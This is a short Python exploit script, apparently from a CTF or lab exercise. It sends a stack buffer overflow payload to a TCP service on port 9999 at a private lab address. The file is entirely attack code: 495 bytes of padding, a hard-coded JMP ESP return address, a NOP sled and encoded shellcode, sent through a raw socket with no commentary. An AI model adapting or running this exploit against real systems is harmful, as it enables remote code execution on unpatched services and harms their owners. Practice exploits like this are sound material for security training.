import socket
import pwn

shellcode =  b""
shellcode += b"\xba\x9d\x29\x7f\xfa\xdd\xc4\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x12\x31\x50\x12\x03\x50\x12"
shellcode += b"\x83\x75\xd5\x9d\x0f\xb4\xfd\x95\x13\xe5\x42"
shellcode += b"\x09\xbe\x0b\xcc\x4c\x8e\x6d\x03\x0e\x7c\x28"
shellcode += b"\x2b\x30\x4e\x4a\x02\x36\xa9\x22\x9f\xc3\x6a"
shellcode += b"\x21\xf7\xd1\x6c\x54\x54\x5f\x8d\xe6\x02\x0f"
shellcode += b"\x1f\x55\x78\xac\x16\xb8\xb3\x33\x7a\x52\x22"
shellcode += b"\x1b\x08\xca\xd2\x4c\xc1\x68\x4a\x1a\xfe\x3e"
shellcode += b"\xdf\x95\xe0\x0e\xd4\x68\x62"

jmp_esp = 0x311712F3 #0x7BCCE5D9
offset = 495
buffer = b"A" * offset + pwn.p32(jmp_esp) + b"\x90" * 32 + shellcode

target = '10.10.92.146'
#target = '127.0.0.1'
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send((b"                          >> " + buffer))
    s.close()
except:
    print(f"Error connecting to the server...")
